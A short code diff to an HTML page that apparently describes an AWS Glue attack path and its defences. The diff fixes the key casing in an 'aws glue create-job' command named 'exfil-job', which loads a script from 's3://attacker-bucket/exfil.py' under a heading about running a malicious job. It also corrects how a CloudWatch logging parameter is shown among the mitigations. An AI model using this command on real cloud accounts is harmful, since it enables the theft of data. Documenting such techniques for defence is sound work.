@@ -369,8 +369,8 @@
           <pre><code>aws glue create-job \\
   --name exfil-job \\
   --role arn:aws:iam::123456789012:role/GlueRole \\
-  --command '{&quot;name&quot;:&quot;pythonshell&quot;,
-    &quot;scriptLocation&quot;:&quot;s3://attacker-bucket/exfil.py&quot;}'</code></pre>
+  --command '{&quot;Name&quot;:&quot;pythonshell&quot;,
+    &quot;ScriptLocation&quot;:&quot;s3://attacker-bucket/exfil.py&quot;}'</code></pre>
         </div>
         <div class="cmd-block">
           <div class="cmd-title">Run the Malicious Job</div>
@@ -495,7 +495,8 @@
             <div>
               <h4>Enable Job Logging</h4>
               <p>Enable continuous CloudWatch logging for all Glue jobs for audit trail.</p>
-              <pre><code>--enable-continuous-cloudwatch-log true</code></pre>
+              <pre><code># Glue special job parameter (set in the job's DefaultArguments map, not a CLI flag):
+'--enable-continuous-cloudwatch-log': 'true'</code></pre>
             </div>
           </div>
         </div>
